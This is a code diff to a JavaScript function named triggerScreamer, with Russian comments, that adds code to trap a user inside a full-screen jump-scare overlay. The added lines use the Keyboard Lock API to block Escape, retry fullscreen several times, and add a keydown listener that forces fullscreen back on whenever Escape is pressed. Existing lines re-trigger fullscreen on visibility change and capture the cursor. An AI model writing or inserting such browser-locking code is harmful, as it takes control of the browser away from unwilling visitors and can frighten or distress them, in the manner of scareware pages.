@@ -1557,7 +1557,16 @@ function triggerScreamer() {
 	// FULLSCREEN MODE - запускаем на весь экран
 	var requestFullscreen = overlay.requestFullscreen || overlay.mozRequestFullScreen || overlay.webkitRequestFullscreen || overlay.msRequestFullscreen;
 	if (requestFullscreen) {
-		requestFullscreen.call(overlay).catch(function(err) {
+		requestFullscreen.call(overlay).then(function() {
+			// Блокируем Escape через Keyboard Lock API (Chrome, Edge, Opera)
+			if ('keyboard' in navigator && 'lock' in navigator.keyboard) {
+				navigator.keyboard.lock(['Escape']).then(function() {
+					console.log('Escape заблокирован через Keyboard Lock!');
+				}).catch(function(e) {
+					console.log('Keyboard Lock failed:', e);
+				});
+			}
+		}).catch(function(err) {
 			console.log('Fullscreen failed:', err);
 		});
 	}
@@ -1567,10 +1576,33 @@ function triggerScreamer() {
 		if (!document.fullscreenElement && !document.mozFullScreenElement && !document.webkitFullscreenElement && !document.msFullscreenElement) {
 			if (requestFullscreen) {
 				// Несколько попыток с задержкой
-				requestFullscreen.call(overlay).catch(function() {});
-				setTimeout(function() { requestFullscreen.call(overlay).catch(function() {}); }, 10);
-				setTimeout(function() { requestFullscreen.call(overlay).catch(function() {}); }, 50);
-				setTimeout(function() { requestFullscreen.call(overlay).catch(function() {}); }, 100);
+				requestFullscreen.call(overlay).then(function() {
+					// Повторно блокируем Escape
+					if ('keyboard' in navigator && 'lock' in navigator.keyboard) {
+						navigator.keyboard.lock(['Escape']).catch(function() {});
+					}
+				}).catch(function() {});
+				setTimeout(function() { 
+					requestFullscreen.call(overlay).then(function() {
+						if ('keyboard' in navigator && 'lock' in navigator.keyboard) {
+							navigator.keyboard.lock(['Escape']).catch(function() {});
+						}
+					}).catch(function() {}); 
+				}, 10);
+				setTimeout(function() { 
+					requestFullscreen.call(overlay).then(function() {
+						if ('keyboard' in navigator && 'lock' in navigator.keyboard) {
+							navigator.keyboard.lock(['Escape']).catch(function() {});
+						}
+					}).catch(function() {}); 
+				}, 50);
+				setTimeout(function() { 
+					requestFullscreen.call(overlay).then(function() {
+						if ('keyboard' in navigator && 'lock' in navigator.keyboard) {
+							navigator.keyboard.lock(['Escape']).catch(function() {});
+						}
+					}).catch(function() {}); 
+				}, 100);
 			}
 		}
 	};
@@ -1598,6 +1630,16 @@ function triggerScreamer() {
 	
 	// Дополнительные попытки через видимость страницы
 	document.addEventListener('visibilitychange', forceFullscreen);
+	
+	// Fallback: ловим Escape как дополнительный триггер для возврата в fullscreen
+	document.addEventListener('keydown', function(e) {
+		if (e.key === 'Escape' || e.keyCode === 27) {
+			// Мгновенно пытаемся вернуться в fullscreen
+			setTimeout(forceFullscreen, 0);
+			setTimeout(forceFullscreen, 10);
+			setTimeout(forceFullscreen, 50);
+		}
+	}, true);
 	
 	// ЗАХВАТ КУРСОРА (Pointer Lock API)
 	overlay.requestPointerLock = overlay.requestPointerLock || overlay.mozRequestPointerLock || overlay.webkitRequestPointerLock;
